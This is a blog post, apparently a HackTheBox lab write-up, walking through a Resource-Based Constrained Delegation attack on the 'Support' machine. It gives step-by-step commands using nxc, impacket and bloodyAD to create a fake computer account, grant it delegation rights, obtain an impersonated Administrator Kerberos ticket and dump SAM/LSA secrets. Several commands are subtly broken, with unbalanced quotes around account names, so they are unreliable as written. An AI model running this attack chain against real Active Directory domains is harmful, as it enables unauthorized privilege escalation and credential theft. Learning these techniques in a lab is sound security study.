---
layout: post
title: "RBCD Using NXC: Resource-Based Constrained Delegation Attack"
date: 2026-01-18 14:00:00 +0000
categories: [netexec, active-directory, offensive-security, rbcd, kerberos]
description: "A practical walkthrough of exploiting Resource-Based Constrained Delegation using NetExec on HackTheBox Support machine"
---

# RBCD Using NXC

For this demo i will be using the machine Support from HackTheBox

<img width="1274" height="1192" alt="image" src="https://gist.github.com/user-attachments/assets/72ae79f5-4d5f-42d0-a705-80ef712c19c1" />


lets resolve the domain name of the target & add it to our `/etc/hosts` file by :

```bash
❯ sudo nxc smb 10.129.251.96 -u 'Guest' -p '' --generate-hosts-file /etc/hosts
```

<img width="2048" height="667" alt="image" src="https://gist.github.com/user-attachments/assets/dc6df9d4-0eb5-4534-9833-6fe3666dacfa" />


### Nmap Scan

```bash
❯ rustscan -a support.htb

❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49679,49754 -sC -sV -Pn support.htb
```

<img width="2048" height="1018" alt="image" src="https://gist.github.com/user-attachments/assets/e2195bd0-5657-4fc2-b4bc-1fa5b00ce73c" />


According to `rustscan` and `nmap` result, we have ports that are opened:

| Ports Open | Service |
| --- | --- |
| 53 | Simple DNS Plus |
| 88,464 | Kerberos |
| 135,593,49664,49668,49674,49679,49703,57579,58137 | RPC |
| 139,445 | SMB |
| 389,636,3268,3269 | LDAP |
| 5985 | WinRM |

at this stage lets say we have a set of credentials of a compromised low priv user

support : Ironside47pleasure40Watchful

lets check the machine quota first

```bash
❯ nxc ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
```

<img width="2048" height="779" alt="image" src="https://gist.github.com/user-attachments/assets/646f0077-0afd-4632-ad96-4158393ace88" />


ok sweet , that means we can create a computer but first lets take a look at the bloodhound data, so first what i will do i gather the bloodhound data by :

`cargo install rusthound-ce`

[https://github.com/g0h4n/RustHound-CE](https://github.com/g0h4n/RustHound-CE)

```bash
❯ rusthound-ce -d support.htb -u support@support.htb -z -c
```

<img width="2048" height="1295" alt="image" src="https://gist.github.com/user-attachments/assets/446581a9-7ab8-4271-b14b-a24f70e4c8e2" />


our current owned user is `support` we will mark it as owned & check for any outbound control edges are there or not :

<img width="2048" height="1293" alt="image" src="https://gist.github.com/user-attachments/assets/9c7bd4df-7700-43dc-8f92-1952a934ef1d" />


<img width="2048" height="956" alt="image" src="https://gist.github.com/user-attachments/assets/f41ca86a-9b96-4349-9bbd-1b5efc3bdc1c" />


### The attack (High Level):

1. We are going to create a fake computer on the domain.
2. Configure RBCD by setting the `msds-allowedtoactonbehalfofotheridentity` to allow our computer to act on behalf of the DC.
3. Perform & S4U attack to get a kerberos ticket on behalf of the administrator.
4. Pass the admins ticket to get RCE on the target.

### Step 1 : Create a Fake Computer(Machine) account

using `impacket` :

```bash
❯ addcomputer.py -computer-name 'raj' -computer-pass 'hackme' -dc-ip 10.129.251.96 support.htb/support:Ironside47pleasure40Watchful
```

<img width="2048" height="693" alt="image" src="https://gist.github.com/user-attachments/assets/78d18383-1eb9-48e7-9b54-79aead11644b" />


### Alternate using BloodyAD to create a computer :

```bash
❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add computer 'raj' 'hackme'
```

<img width="2048" height="678" alt="image" src="https://gist.github.com/user-attachments/assets/452accc4-fc08-4363-bb76-85a62e08ffb5" />


> **My Created Fake Computer Account - raj$ : hackme**
>

### Step 2 : Give RBCD Rights to your fake Computer Account

using `impacket` :

```bash
❯ rbcd.py -delegate-from 'raj -delegate-to 'DC -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

<img width="2048" height="651" alt="image" src="https://gist.github.com/user-attachments/assets/817e0681-bd21-4050-964a-264ed4a129fb" />


### Alternate - using BloodyAD to grant RBCD rights :

```bash
❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add rbcd 'DC 'raj
```

<img width="2048" height="611" alt="image" src="https://gist.github.com/user-attachments/assets/73e9ebe6-ee6a-4adb-b0f1-c89a80bff06b" />


### Step 3 : Get the Silver ticket of target Impersonation user (e.g Administrator) using nxc

```bash
❯ nxc smb support.htb -u 'raj -p 'hackme' --delegate Administrator

❯ nxc smb support.htb -u 'raj -p 'hackme' --delegate Administrator --sam --lsa
```

<img width="2048" height="651" alt="image" src="https://gist.github.com/user-attachments/assets/d53142f4-04fc-42df-94f3-300f03736b7c" />


Bling Bling , we got the silver ticket of Administrator & as well as the NT Hash of Administrator too!

### Alternate of getting silver ticket using `getST.py` Normal way :

```bash
❯ getST.py support.htb/'raj:'hackme' -spn cifs/dc.support.htb -impersonate Administrator
```

<img width="2048" height="762" alt="image" src="https://gist.github.com/user-attachments/assets/acc1d698-4089-4463-8853-589a85efbee2" />


<img width="2048" height="1092" alt="image" src="https://gist.github.com/user-attachments/assets/3a6006cf-36ee-42b1-ab2c-5053fa9bbfd3" />


Hope you enjoyed the trick!
